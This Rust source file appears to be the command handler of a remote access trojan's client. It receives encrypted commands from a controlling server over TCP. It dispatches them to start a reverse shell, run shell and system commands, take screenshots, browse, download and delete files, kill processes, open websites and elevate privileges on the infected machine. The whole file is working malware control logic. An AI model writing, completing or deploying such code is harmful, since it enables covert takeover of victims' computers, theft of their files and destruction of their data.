use std::net::TcpStream;
use std::sync::{ Arc, Mutex };

use common::buffers::read_buffer;
use rand::{ rngs::OsRng, Rng };
use std::process;
use crate::{ SECRET, SECRET_INITIALIZED, REVERSE_SHELL };

use common::commands::Command;

use crate::features::file_manager::FileManager;
use crate::features::encryption::generate_secret;
use crate::features::system_commands::system_commands;
use crate::features::other::{
    take_screenshot,
    client_info,
    visit_website,
    elevate_client,
    show_messagebox,
};
use crate::features::process::{ process_list, kill_process };

pub fn handle_server(
    mut read_stream: TcpStream,
    mut write_stream: TcpStream,
    is_connected: Arc<Mutex<bool>>,
    is_connecting: Arc<Mutex<bool>>
) {
    OsRng.fill(&mut *SECRET.lock().unwrap());

    let mut file_manager = FileManager::new();

    let mut reverse_shell_lock = crate::REVERSE_SHELL.lock().unwrap();

    loop {
        let secret_clone = Some(SECRET.lock().unwrap().to_vec());
        let received_command = read_buffer(&mut read_stream, if
            SECRET_INITIALIZED.lock().unwrap().clone()
        {
            &secret_clone
        } else {
            &None
        });

        match received_command {
            Ok(command) => {
                println!("Received command: {:?}", command);
                match command {
                    Command::EncryptionRequest(data) => {
                        generate_secret(&mut write_stream, data);
                    }
                    Command::InitClient => {
                        client_info(&mut write_stream, &Some(SECRET.lock().unwrap().to_vec()));
                    }
                    Command::Reconnect => {
                        *crate::SECRET_INITIALIZED.lock().unwrap() = false;
                        *is_connected.lock().unwrap() = false;
                        *is_connecting.lock().unwrap() = false;
                        break;
                    }
                    Command::Disconnect => {
                        reverse_shell_lock.exit_shell();
                        process::exit(1);
                    }
                    Command::GetProcessList => {
                        process_list(&mut write_stream, &Some(SECRET.lock().unwrap().to_vec()));
                    }
                    Command::KillProcess(data) => {
                        kill_process(data.pid);
                    }
                    Command::ShowMessageBox(data) => {
                        show_messagebox(data);
                    }
                    Command::StartShell => {
                        reverse_shell_lock.start_shell(
                            Arc::new(
                                Mutex::new(
                                    write_stream.try_clone().expect("Failed to clone TcpStream")
                                )
                            ),
                            &Some(SECRET.lock().unwrap().to_vec())
                        );
                    }
                    Command::ExitShell => {
                        reverse_shell_lock.exit_shell();
                    }
                    Command::ShellCommand(data) => {
                        reverse_shell_lock.execute_shell_command(&data);
                    }
                    Command::ScreenshotDisplay(data) => {
                        take_screenshot(
                            &mut write_stream,
                            data.parse::<i32>().unwrap(),
                            &Some(SECRET.lock().unwrap().to_vec())
                        );
                    }
                    Command::ManageSystem(data) => {
                        system_commands(&data);
                    }
                    Command::AvailableDisks => {
                        file_manager.list_available_disks(
                            &mut write_stream,
                            &Some(SECRET.lock().unwrap().to_vec())
                        );
                    }
                    Command::PreviousDir => {
                        file_manager.navigate_to_parent(
                            &mut write_stream,
                            &Some(SECRET.lock().unwrap().to_vec())
                        );
                    }
                    Command::ViewDir(data) => {
                        file_manager.view_folder(
                            &mut write_stream,
                            &data,
                            &Some(SECRET.lock().unwrap().to_vec())
                        );
                    }
                    Command::RemoveDir(data) => {
                        file_manager.remove_directory(
                            &mut write_stream,
                            &data,
                            &Some(SECRET.lock().unwrap().to_vec())
                        );
                    }
                    Command::RemoveFile(data) => {
                        file_manager.remove_file(
                            &mut write_stream,
                            &data,
                            &Some(SECRET.lock().unwrap().to_vec())
                        );
                    }
                    Command::DownloadFile(data) => {
                        file_manager.download_file(
                            &mut write_stream,
                            &data,
                            &Some(SECRET.lock().unwrap().to_vec())
                        );
                    }
                    Command::VisitWebsite(data) => {
                        visit_website(
                            &mut write_stream,
                            &data.visit_type,
                            &data.url,
                            &Some(SECRET.lock().unwrap().to_vec())
                        );
                    }
                    Command::ElevateClient => {
                        elevate_client();
                    }
                    _ => {
                        println!("Received an unknown or unhandled command.");
                    }
                }
            }
            Err(_) => {
                println!("Disconnected!");
                {
                    *crate::SECRET_INITIALIZED.lock().unwrap() = false;
                    *is_connected.lock().unwrap() = false;
                    *is_connecting.lock().unwrap() = false;
                    reverse_shell_lock.exit_shell();
                }
                break;
            }
        }
    }
}
